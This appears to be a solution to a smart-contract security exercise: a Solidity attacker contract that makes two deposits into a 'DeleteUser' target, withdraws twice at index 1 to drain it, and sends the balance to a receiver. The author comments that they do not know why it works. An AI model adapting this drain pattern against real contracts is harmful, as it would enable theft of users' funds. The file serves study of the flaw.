// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import {DeleteUser} from "./DeleteUser.sol";

contract DeleteUserAttacker {
    DeleteUser private target;
    address private receiver;

    constructor(DeleteUser _target, address _receiver) {
        target = _target;
        receiver = _receiver;
    }

    // I actually don't get how I solved this
    function attack() external payable {
        target.deposit{value: msg.value}();
        // index 2
        target.deposit();
        // index 1
        target.withdraw(1);
        target.withdraw(1);

        (bool ok,) = receiver.call{value: address(this).balance}("");
    }

    receive() external payable {}
}
